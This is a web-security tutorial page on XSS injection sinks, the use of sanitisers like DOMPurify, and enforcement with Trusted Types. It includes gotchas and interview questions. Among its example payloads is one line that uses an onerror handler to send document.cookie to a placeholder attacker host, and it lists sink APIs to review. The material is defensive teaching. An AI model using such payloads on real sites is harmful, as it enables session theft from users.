---
title: "06.1 · Sinks and sanitisers"
sidebar_label: "01 · Sinks and sanitisers"
sidebar_position: 1
---

<span className="db-tier t-master">Master</span>

> Verified: 2026-08-14 against MDN — [Trusted Types API](https://developer.mozilla.org/en-US/docs/Web/API/Trusted_Types_API), [`Element.innerHTML`](https://developer.mozilla.org/en-US/docs/Web/API/Element/innerHTML), [`Element.insertAdjacentHTML()`](https://developer.mozilla.org/en-US/docs/Web/API/Element/insertAdjacentHTML). Documentation-validated.

**This is the one security bug a frontend developer is most likely to ship personally.** Not
a misconfigured header, not a dependency CVE — a string from a user reaching an API that
parses it.

## What a sink is

MDN's definition, which is the vocabulary worth having:

> "An **injection sink** is an API that could execute untrusted data as code."

And the three kinds it distinguishes:

> - **HTML sinks**: "APIs that interpret their input as HTML, such as `Element.innerHTML` or
>   `document.write()`. These APIs could execute JavaScript if it is embedded in the HTML,
>   for example in `<script>` tags or **event handler attributes**."
> - **JavaScript sinks**: "APIs that interpret their input as JavaScript, such as `eval()` or
>   `HTMLScriptElement.text`."
> - **JavaScript URL sinks**: "APIs that interpret their input as the URL of a script, such as
>   `HTMLScriptElement.src`."

🔴 **"or event handler attributes" is the clause that matters.** It is why *"inserted
`<script>` tags don't run"* ([04](../04-text-vs-html/README.md)) is no defence: the payload
does not need a script tag.

```html
<img src=x onerror="fetch('https://attacker/?c='+document.cookie)">
<svg onload="…">
<a href="javascript:…">
<iframe srcdoc="…">
```

An `onerror` on a deliberately broken image is the canonical payload precisely because it is
short, needs no script tag, and looks like content.

## The sinks to grep for

A practical review list. Anything on it that receives a value you did not construct is a
finding:

| Kind | APIs |
|---|---|
| **HTML** | `innerHTML`, `outerHTML`, `insertAdjacentHTML`, `document.write`, `document.writeln`, `DOMParser.parseFromString`, `Range.createContextualFragment`, `iframe.srcdoc` |
| **JavaScript** | `eval`, `new Function`, `setTimeout`/`setInterval` **with a string**, `script.text`/`.textContent`/`.innerText` |
| **URL** | `script.src`, `iframe.src`, `a.href` and `location` with a `javascript:` URL, `worker` constructors |
| **Attribute** | `setAttribute` for any `on*` handler, `style` in some contexts |

**`setTimeout("doThing()", 100)` is an `eval`.** It is rare in modern code and worth grepping
for anyway, because it is the one people forget is a sink at all.

## The fix order

**1. Do not parse it.** The overwhelming majority of "we need HTML" turns out to be text.

```js
el.textContent = userInput;        // ✅ cannot inject, whatever the string
el.append(userInput);              // ✅ same — strings become text nodes
el.insertAdjacentText(pos, s);     // ✅ the four positions without the sink
```

🔴 **This is the real fix, and it is available far more often than people assume.** A username,
a comment body, a search term, an error message — all text. Reaching for `innerHTML` to render
text is choosing a sink for no benefit.

**2. If you genuinely have markup, sanitise it with a library.**

```js
el.innerHTML = DOMPurify.sanitize(untrusted);
```

**Do not write the sanitiser.** Escaping `<` and `>` by hand fails because HTML has many
contexts — inside an attribute, inside an unquoted attribute, inside a URL, inside `<style>`,
inside SVG, inside `<template>` — and each escapes differently. Sanitiser authors handle
mutation XSS, namespace confusion between HTML and SVG, and parser quirks that took years to
enumerate. A hand-rolled `replace(/</g, "&lt;")` is not a small version of that; it is a
different and wrong thing.

**3. Set the sanitiser's allowlist deliberately.** A sanitiser configured to allow everything
is decoration. Decide what markup the feature actually needs — usually `<b>`, `<i>`, `<a>`,
lists — and allow only that.

**4. Never trust "it was sanitised on the server".** Server sanitisation and browser parsing
disagree; a string safe by the server's parser can become executable under the browser's.
Sanitise at the point of insertion, where you know the parser that will run.

## Trusted Types — making the sink refuse strings

Sanitising correctly still depends on remembering to do it, everywhere, forever. Trusted Types
removes that dependence. MDN:

> "The Trusted Types API gives web developers a way to ensure that input has been passed
> through a **user-specified transformation function** before being passed to an API that
> might execute that input."

You declare a policy:

```js
const policy = trustedTypes.createPolicy("my-policy", {
  createHTML: (input) => DOMPurify.sanitize(input),
});
```

and the sink accepts only its output:

```js
const trustedHTML = policy.createHTML(userInput);
element.innerHTML = trustedHTML;
```

Then you turn on enforcement with a CSP directive — `require-trusted-types-for` — and MDN
states the effect exactly:

> "With this directive set, passing **strings** into injection sinks will result in a
> **`TypeError`** exception":

```js
element.innerHTML = userInput; // Throws a TypeError
```

🔴 **This converts "we must remember to sanitise" into "the platform will not let us
forget."** Every sink in the application, including ones inside dependencies, starts throwing
on a raw string. That is a categorically stronger guarantee than a code-review rule.

### The default policy is a migration tool

MDN:

> "If you create a policy named `"default"`, and your CSP enforces the use of trusted types,
> then any string argument passed into injection sinks will be **automatically** passed to
> this policy"

```js
trustedTypes.createPolicy("default", {
  createHTML(value) {
    console.log("Please refactor this code");
    return sanitize(value);
  },
});
```

And MDN's caveat, which is the important half:

> "It's recommended that you use the default policy **only while you are transitioning** from
> legacy code that passes input directly to injection sinks, to code that uses trusted types
> explicitly."

A permanent default policy re-creates the original problem with extra steps: every sink
silently accepts strings again, and the enforcement that made the guarantee is gone. Use it to
find the call sites — the `console.log` above is the point — then fix them and remove it.

**Availability is the practical constraint**: Trusted Types is not supported in every engine.
Where it is unavailable the CSP directive is simply ignored, so it is a hardening layer on top
of sanitising rather than a replacement for it — check current support before relying on it.

## Gotchas

**Symptom:** *"`innerHTML` is fine, scripts don't execute"*
**Cause:** True and irrelevant. MDN's own definition names *"event handler attributes"* as
executing JavaScript.
**Fix:** `<img src=x onerror=…>` needs no script tag. Treat every HTML sink as a sink.

**Symptom:** A hand-written escaper is bypassed
**Cause:** HTML has many contexts — attribute, unquoted attribute, URL, `<style>`, SVG — each
escaping differently.
**Fix:** Use a maintained sanitiser. Do not write one.

**Symptom:** A sanitiser is in place and XSS still gets through
**Cause:** Its allowlist permits too much, or it runs on the server where a different parser
decides.
**Fix:** Restrict the allowlist to what the feature needs, and sanitise at the point of
insertion.

**Symptom:** `TypeError` on assigning to `innerHTML` after a CSP change
**Cause:** `require-trusted-types-for` is enforcing — MDN: passing strings *"will result in a
`TypeError`"*.
**Fix:** Route the value through a policy's `createHTML`. This is the mechanism working.

**Symptom:** Trusted Types was enabled and nothing changed
**Cause:** Either the engine does not support it, or a permanent `"default"` policy is
swallowing every string.
**Fix:** Check support; treat the default policy as temporary, as MDN recommends.

**Symptom:** `setTimeout("doThing()", 100)` flagged in a security review
**Cause:** The string form is a JavaScript sink — effectively `eval`.
**Fix:** Pass a function.

## Interview questions

**★ What is an injection sink?**
MDN: *"an API that could execute untrusted data as code."* Three kinds — **HTML** sinks
(`innerHTML`, `document.write`), **JavaScript** sinks (`eval`, `script.text`) and
**JavaScript URL** sinks (`script.src`).

**★ Why isn't "scripts inserted via `innerHTML` don't run" a defence?**
Because MDN's definition explicitly includes *"event handler attributes"*.
`<img src=x onerror="…">` and `<svg onload="…">` execute with no script tag, which is exactly
why they are the canonical payloads.

**★ What is the first fix for an XSS risk?**
**Do not parse.** `textContent`, `append` with a string, or `insertAdjacentText` — all treat
the value as text no matter what it contains. Most cases that "need HTML" are text.

**★ Why not write your own escaper?**
HTML escaping is context-dependent — attribute, unquoted attribute, URL, `<style>`, SVG — and
sanitisers additionally handle mutation XSS and parser quirks. A `replace(/</g, "&lt;")` is
not a smaller version of a sanitiser; it is a different, wrong thing.

**★ What do Trusted Types add over sanitising?**
Enforcement. With `require-trusted-types-for`, MDN says passing a **string** into a sink
*"will result in a `TypeError`"* — so the platform refuses, application-wide and including
dependencies, instead of relying on everyone remembering. Sanitising is still what the policy
*does*; Trusted Types is what guarantees it happens.

**What is the `"default"` policy for?**
Migration only. MDN recommends it *"only while you are transitioning"* — it silently routes
every string through one function, which is useful for finding call sites and harmful if left
permanently, since it restores the original problem.

---

[Topic index](./README.md) · Next → [Phase index](../README.md)
